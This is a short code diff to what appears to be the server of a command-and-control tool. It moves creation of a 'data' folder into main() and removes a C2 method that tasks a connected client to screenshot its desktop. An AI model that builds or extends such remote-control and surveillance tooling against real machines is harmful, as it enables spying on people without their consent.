@@ -117,6 +117,12 @@ def main():
         util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
         sys.exit(0)
 
+    if not os.path.isdir('data'):
+        try:
+            os.mkdir('data')
+        except OSError:
+            util.log("Unable to create directory 'data' (permission denied)")
+
     options = parser.parse_args()
     __debug = options.debug
 
@@ -579,25 +585,6 @@ class C2():
             task = client.recv_task()
             result = task.get('result')
         util.display(result)
-
-    def session_screenshot(self):
-        """
-        Take a screenshot of the client desktop
-
-        """
-        if not self.current_session:
-            return "No client session"
-        else:
-            if not os.path.isdir('data'):
-                try:
-                    os.mkdir('data')
-                except OSError:
-                    util.log("Unable to create directory 'data' (permission denied)")
-                    return
-            task = {"task": "screenshot", "session": self.current_session.info.get('uid')}
-            self.current_session.send_task(task)
-            time.sleep(2)
-            return "Screenshot complete"
 
     def session_remove(self, session_id):
         """ 
